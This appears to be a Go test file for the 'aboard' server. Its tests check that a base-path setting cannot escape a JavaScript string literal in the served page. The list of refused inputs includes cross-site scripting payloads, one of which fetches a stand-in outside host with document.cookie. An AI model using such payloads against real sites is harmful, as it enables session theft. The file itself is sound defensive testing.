package aboard

import (
	"bytes"
	"context"
	"io"
	"io/fs"
	"log"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/exoport/aboard/pkg/aboard/web"
)

// The normalisation cases that are ABOUT validation live here beside it; the
// plain shape table stays in layout_test.go with the other path resolution.
// The injection. `serveShell` splices the normalised base into the shell as
// `window.ABOARD_BASE = "<base>";` — inside a JS STRING LITERAL — and nothing
// checked what was in it, so a double quote closed the literal and everything
// after it ran on the board's own origin. The flag belongs to whoever starts the
// server, which is what keeps this a hardening fix rather than a hole; it stops
// being that the moment a wrapper builds the flag from something it read.
func TestABasePathThatWouldEscapeTheScriptIsRefused(t *testing.T) {
	refused := []string{
		`/brd";alert(1)//`,
		`/brd";fetch("http://elsewhere/?"+document.cookie)//`,
		`/brd"`,
		`/a'b`,
		"/a\\b",
		"/a<b",
		"/a\nb",
		"/a b",
		"/a/../b", // not a traversal, but nonsense that would need explaining
		"/..",
		"/.",
		"/a/./b",
		"/a%2fb",
		"/a?b=1",
		"/a#b",
	}
	for _, raw := range refused {
		if err := ValidateBasePath(raw); err == nil {
			t.Errorf("ValidateBasePath(%q) allowed it", raw)
		}
	}

	accepted := []string{"", "/", "/aboard", "aboard", "/a/b/c", "/Board-v1.2", "/a_b", "/a-b", "/a~b"}
	for _, raw := range accepted {
		if err := ValidateBasePath(raw); err != nil {
			t.Errorf("ValidateBasePath(%q) refused a usable prefix: %v", raw, err)
		}
	}
}

// Serve refuses it too, for an embedder that never went through the CLI — and
// before it binds a port or touches a file.
func TestServeRefusesAnUnusableBasePath(t *testing.T) {
	root := Root(t.TempDir())
	err := Serve(context.Background(), Options{Logger: log.New(io.Discard, "", 0)},
		ServeConfig{Root: root, BasePath: `/brd";alert(1)//`})
	if err == nil {
		t.Fatal("Serve accepted a base path that cannot be one")
	}
	if !strings.Contains(err.Error(), "base path") {
		t.Errorf("the refusal does not name the base path: %v", err)
	}
}

// And the splice itself, end to end: the marker is replaced with exactly the
// normalised prefix and the literal is still a literal.
func TestServeShellInjectsTheBasePath(t *testing.T) {
	shell, err := fs.ReadFile(web.FS, "aboard.html")
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(shell, []byte(basePlaceholder)) {
		t.Fatalf("aboard.html no longer ships the %s marker", basePlaceholder)
	}

	for _, base := range []string{"", "/brd", "/a/b"} {
		s := &server{
			opts:   Options{Logger: log.New(io.Discard, "", 0)},
			assets: web.FS,
			base:   NormalizeBasePath(base),
		}
		rec := httptest.NewRecorder()
		s.serveShell(rec, httptest.NewRequest(http.MethodGet, "/", http.NoBody))

		want := `window.ABOARD_BASE = "` + NormalizeBasePath(base) + `";`
		if !strings.Contains(rec.Body.String(), want) {
			t.Errorf("base %q: the shell does not carry %s", base, want)
		}
	}
}
